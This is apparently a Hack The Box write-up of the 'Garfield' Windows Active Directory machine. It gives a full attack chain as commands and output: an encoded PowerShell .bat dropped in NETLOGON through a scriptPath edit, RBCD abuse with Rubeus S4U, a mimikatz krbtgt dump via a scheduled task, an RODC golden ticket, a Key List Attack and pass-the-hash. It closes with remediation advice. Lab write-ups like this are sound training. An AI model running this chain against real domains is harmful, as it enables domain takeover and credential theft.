---
title: HTB Garfield
slug: htb-garfield-writeup
type: writeup
category: htb
date: 2025-09-10
difficulty: hard
os: windows
readTime: 16 min read
points: 60
tags: [AD, RODC, KERBEROS]
classification: CLASSIFIED-WHITE
summary: IT-support user `j.arbuckle` has `scriptPath` WRITE on Liz Wilson — drop a `.bat` in NETLOGON, flip her scriptPath, and her ForceChangePassword propagates to `l.wilson_adm`. l.wilson_adm can `AddSelf` to RODC Administrators and has `WriteAccountRestrictions` on `RODC01$`, enabling an RBCD chain that impersonates Administrator on the internal RODC. Dump `krbtgt_8245`, clear the RODC deny-list, forge an RODC golden ticket, and run a Key List Attack to extract Administrator's NT hash.
engagement:
  platform: Hack The Box
  target: garfield.htb
  ref: 10.129.15.191
  duration: 16 min read
  operator: WDD-01
killchain:
  - { stage: RECON,    sub: "dc + rodc via vmrdp:2179",    tag: AD,       color: warn }
  - { stage: ACL,      sub: "scriptPath write chain",      tag: BLOODYAD, color: warn }
  - { stage: USER,     sub: "l.wilson_adm winrm",          tag: PWN3D,    color: warn }
  - { stage: RBCD,     sub: "RODC01$ delegation",          tag: S4U2,     color: warn }
  - { stage: KRBTGT,   sub: "dump krbtgt_8245 on RODC",    tag: MIMIKATZ, color: warn }
  - { stage: ROOT,     sub: "RODC golden + key list",      tag: GOAL,     color: ok }
loadout:
  - { tool: nmap,       purpose: recon }
  - { tool: netexec,    purpose: auth }
  - { tool: bloodyAD,   purpose: ace-flip }
  - { tool: smbclient,  purpose: netlogon }
  - { tool: impacket,   purpose: rbcd }
  - { tool: Rubeus,     purpose: s4u + golden }
  - { tool: PowerView,  purpose: prp }
  - { tool: mimikatz,   purpose: dump }
remediation:
  - Don't grant helpdesk groups `scriptPath` WRITE on domain users
  - Scope `WriteAccountRestrictions` tightly — it implies RBCD primitives
  - Keep `msDS-RevealOnDemandGroup` / `msDS-NeverRevealGroup` reviewed; Domain Admins must stay on the never-reveal list
  - Monitor for `kvno` values indicating an RODC golden ticket (`(key_version << 16) | rodc_number`)
---

::: stage n=1 label="RECON" title="DC01 hosts a VM — Hyper-V :2179 is the tell."

::: terminal title="shell · operator@kali" lang="bash"
$ nmap -Pn -sV -sC --top-ports 1000 --min-rate 5000 10.129.15.191
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec
389/tcp  open  ldap          Domain: garfield.htb
445/tcp  open  microsoft-ds
2179/tcp open  vmrdp?                     ← Hyper-V
3389/tcp open  ms-wbt-server
5985/tcp open  http          WinRM
:::

Port {warn:2179} is Hyper-V VMConnect — DC01 is hosting a VM, which later turns out to be RODC01 on an internal network at `192.168.100.2`.

Validate the provided creds across protocols:

::: terminal title="shell · netexec · j.arbuckle" lang="bash"
$ netexec smb   10.129.15.191 -u j.arbuckle -p '[REDACTED]'  [+]
$ netexec winrm 10.129.15.191 -u j.arbuckle -p '[REDACTED]'  [-]  not in Remote Management Users
$ netexec ldap  10.129.15.191 -u j.arbuckle -p '[REDACTED]'  [+]
:::

User list shows `krbtgt_8245` — the RID giveaway for an {red:RODC KDC service account}. That's the key lever for later.

:::

::: stage n=2 label="ACL" title="scriptPath WRITE → ForceChangePassword chain."

`bloodyAD get writable --detail` as `j.arbuckle` shows `scriptPath` WRITE on Liz Wilson + Liz Wilson ADM. Combined with BloodHound, the chain is:

```
j.arbuckle ──[scriptPath WRITE]──▶ l.wilson
l.wilson   ──[ForceChangePassword]─▶ l.wilson_adm
l.wilson_adm ─[ForceChangePassword, WriteAccountRestrictions]─▶ RODC01$
l.wilson_adm ─[AddSelf]─▶ RODC Administrators
```

The DC has a scheduled script (`RDP-Connect.ps1`) that reads Liz's `scriptPath`, validates `.bat`, and runs it from NETLOGON. The trigger is {warn:one-shot} — fires only when the attribute changes. No loop; miss it, flip the attribute again.

Base64-encode a password reset, wrap in `.bat`:

::: terminal title="shell · operator@kali" lang="bash"
$ echo -ne 'Set-ADAccountPassword -Identity "l.wilson_adm" -Reset \
    -NewPassword (ConvertTo-SecureString "[REDACTED]" \
    -AsPlainText -Force)\n' \
    | iconv -f UTF-8 -t UTF-16LE | base64
:::

::: terminal title="shell · pwChange.bat" lang="batch"
@echo off
echo Running system diagnostics...
powershell -enc <base64_from_above>
:::

Drop into NETLOGON and flip Liz's `scriptPath`:

::: terminal title="shell · bloodyAD + smbclient" lang="bash"
$ smbclient //10.129.15.191/SYSVOL \
    -U 'garfield.htb/j.arbuckle%[REDACTED]' \
    -c 'cd garfield.htb/scripts; put pwChange.bat pwChange.bat'

$ bloodyAD --host 10.129.15.191 -u j.arbuckle -p '[REDACTED]' \
    -d garfield.htb set object \
    "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath \
    -v "pwChange.bat"
:::

Wait ~15s. `l.wilson_adm` now has `[REDACTED]` and WinRM access. `user.txt` under her desktop.

:::

::: stage n=3 label="USER" title="l.wilson_adm → WinRM + AddSelf to RODC Administrators."

::: terminal title="shell · l.wilson_adm via bloodyAD" lang="bash"
$ bloodyAD --host 10.129.15.191 -u l.wilson_adm -p '[REDACTED]' \
    -d garfield.htb add groupMember "RODC Administrators" l.wilson_adm
[+] l.wilson_adm added
:::

{warn:Reconnect WinRM} after adding to the group — Kerberos tickets carry stale group SIDs otherwise.

:::

::: stage n=4 label="RBCD" title="WriteAccountRestrictions on RODC01$ → S4U2Proxy as Administrator."

Create a throwaway machine account and configure RBCD against the RODC:

::: terminal title="shell · impacket" lang="bash"
$ impacket-addcomputer garfield.htb/l.wilson_adm:'[REDACTED]' \
    -computer-name 'ATTACK01$' -computer-pass '[REDACTED]' \
    -dc-ip 10.129.15.191

$ impacket-rbcd garfield.htb/l.wilson_adm:'[REDACTED]' \
    -delegate-to 'RODC01$' -delegate-from 'ATTACK01$' \
    -dc-ip 10.129.15.191 -action write
[*] Delegation rights modified successfully
:::

RODC01 is only reachable at `192.168.100.2` — from DC01's internal side. Upload Rubeus to DC01 via certutil and run S4U from there:

::: terminal title="shell · Rubeus on DC01" lang="powershell"
PS> .\Rubeus.exe s4u /user:ATTACK01$ /rc4:<NTLM_HASH> `
      /impersonateuser:Administrator `
      /msdsspn:cifs/rodc01.garfield.htb `
      /domain:garfield.htb /dc:DC01.garfield.htb /nowrap
[+] S4U2self success!
[+] S4U2proxy success!
[*] base64(ticket.kirbi): doIGpj...

PS> .\Rubeus.exe createnetonly /program:cmd.exe /ticket:<b64>
PS> dir \\rodc01.garfield.htb\C$
:::

::: warn title="DON'T CHANGE RODC01$ PASSWORD"
Rotating the RODC machine account's password breaks Kerberos trust between DC01 and RODC01. Don't touch it.
:::

:::

::: stage n=5 label="KRBTGT" title="Schedule mimikatz on RODC01 as SYSTEM."

Push mimikatz to NETLOGON, register a scheduled task on the RODC that runs it as SYSTEM, and triggers it manually:

::: terminal title="shell · schtasks via RBCD-acquired session" lang="powershell"
PS> schtasks /create /s rodc01.garfield.htb /tn DumpRODC `
      /tr "\\garfield.htb\NETLOGON\dump_rodc.bat" `
      /sc once /st 00:00 /ru SYSTEM /f

PS> schtasks /run /s rodc01.garfield.htb /tn DumpRODC
:::

Output (key types only):

```
krbtgt_8245 NTLM:   [REDACTED]
krbtgt_8245 AES256: [REDACTED]
```

:::

::: stage n=6 label="ROOT" title="Flip the RODC PRP, forge a golden, Key List Administrator."

RODC Password Replication has two layers:

- `msDS-RevealOnDemandGroup` — allow list
- `msDS-NeverRevealGroup` — deny list (Domain Admins by default)

The Key List Attack only works if Administrator is on the allow list {warn:and} the deny list is cleared:

::: terminal title="shell · PowerView on DC01" lang="powershell"
PS> Import-Module .\pv.ps1
PS> Set-DomainObject -Identity RODC01$ -Set @{
      'msDS-RevealOnDemandGroup'=@(
        'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
        'CN=Administrator,CN=Users,DC=garfield,DC=htb'
      )
    }
PS> Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
:::

Forge an RODC golden ticket with `rodcNumber:8245`. {warn:impacket-ticketer does not support this} — the `kvno` format is `(key_version << 16) | rodc_number` and only Rubeus gets it right:

::: terminal title="shell · Rubeus · RODC golden + Key List" lang="powershell"
PS> $tgt = .\Rubeus.exe golden `
      /rodcNumber:8245 `
      /flags:forwardable,renewable,enc_pa_rep `
      /aes256:[REDACTED] `
      /user:Administrator /id:500 `
      /domain:garfield.htb `
      /sid:S-1-5-21-2502726253-3859040611-225969357 `
      /nowrap

PS> $b64 = ($tgt | Select-String "doI").Line.Trim()

PS> .\Rubeus.exe asktgs `
      /enctype:aes256 /keyList `
      /service:krbtgt/garfield.htb `
      /dc:DC01.garfield.htb `
      /ticket:$b64 /nowrap
[+] TGS request successful!
UserName        : Administrator
Password Hash   : [NT HASH]
:::

Pass-the-hash and read the flag:

::: terminal title="shell · netexec · PTH" lang="bash"
$ netexec smb 10.129.15.191 -u Administrator \
    -H '[NT HASH]' \
    -x 'type C:\Users\Administrator\Desktop\root.txt'
[+] garfield.htb\Administrator (Pwn3d!)
<root flag>
:::

::: note title="HOW THE KEY LIST ATTACK WORKS"
1. The RODC golden ticket is signed with `krbtgt_8245`'s AES256 key.
2. DC01 validates the ticket and checks the RODC's `msDS-RevealOnDemandGroup`.
3. If the impersonated principal is revealable, DC01 returns that principal's Kerberos keys inside the TGS response — including the NTLM hash.
4. Rubeus's `/keyList` parses them out.

This only works because we added Administrator to the allow list and cleared Domain Admins from the deny list.
:::

:::
